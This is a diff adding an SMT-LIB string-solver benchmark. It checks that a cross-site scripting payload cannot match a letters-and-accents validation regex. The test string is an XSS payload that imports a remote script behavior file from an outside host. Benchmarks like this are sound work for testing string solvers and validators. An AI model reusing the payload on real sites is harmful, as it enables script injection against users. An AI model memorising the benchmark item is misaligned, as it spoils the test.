@@ -1,0 +1,6 @@
+(set-logic QF_S)
+(set-info :status unsat)
+(declare-const x String)
+(assert (str.in_re x (re.from_ecma2020 "^[a-zA-Z\u{e0}\u{e1}\u{e2}\u{e3}\u{e4}\u{e7}\u{e8}\u{e9}\u{ea}\u{eb}\u{ec}\u{ed}\u{ee}\u{ef}\u{f1}\u{f2}\u{f3}\u{f4}\u{f5}\u{f6}\u{f9}\u{fa}\u{fb}\u{fc}\u{fd}\u{ff}\u{c0}\u{c1}\u{c2}\u{c3}\u{c4}\u{c7}\u{c8}\u{c9}\u{ca}\u{cb}\u{cc}\u{cd}\u{ce}\u{cf}\u{d1}\u{d2}\u{d3}\u{d4}\u{d5}\u{d6}\u{d9}\u{da}\u{db}\u{dc}\u{dd}\s]+$")))
+(assert (= x "<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://www.securitycompass.com/xss.htc""><xss:xss>XSS</xss:xss></html>"))
+(check-sat)
